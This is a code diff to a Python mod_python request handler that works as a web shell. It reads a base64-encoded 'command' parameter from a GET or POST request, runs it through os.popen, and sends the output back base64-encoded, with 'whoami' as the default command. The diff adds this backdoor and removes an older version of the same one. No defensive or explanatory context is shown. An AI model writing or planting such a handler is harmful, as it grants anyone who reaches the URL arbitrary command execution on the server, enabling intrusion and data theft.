@@ -2,18 +2,27 @@ import os
 import base64
 from mod_python import apache, util
 
+API_DEFAULTCOMMAND = 'whoami'
+
 def main(req):
-    try:
-        form = util.FieldStorage(req, keep_blank_values=1)
-        
-        #TODO: handle POST request in mod_python
-        #len = int(req.headers_in["content-length"])
-        #form_data = req.read(len)
-
-        cmd = base64.b64decode(form['cmd'])
-        cmd_result = os.popen(cmd).read()
-
-    except Exception,e:
-        cmd_result = str(e)
-
-    return base64.b64encode(cmd_result)
+	command = False
+	
+	try:
+		if req.method.upper() == 'POST':
+			command = req.form.getfirst('command')
+		else:
+			form = util.FieldStorage(req, keep_blank_values=1)
+			command = form['command']
+	except Exception,e:
+		output = str(e)
+	
+	if not command:
+		command = base64.b64encode(API_DEFAULTCOMMAND)
+	
+	try:
+		command = base64.b64decode(command)
+		output = os.popen(command).read()
+	except Exception,e:
+		output = str(e)
+	
+	return base64.b64encode(output)
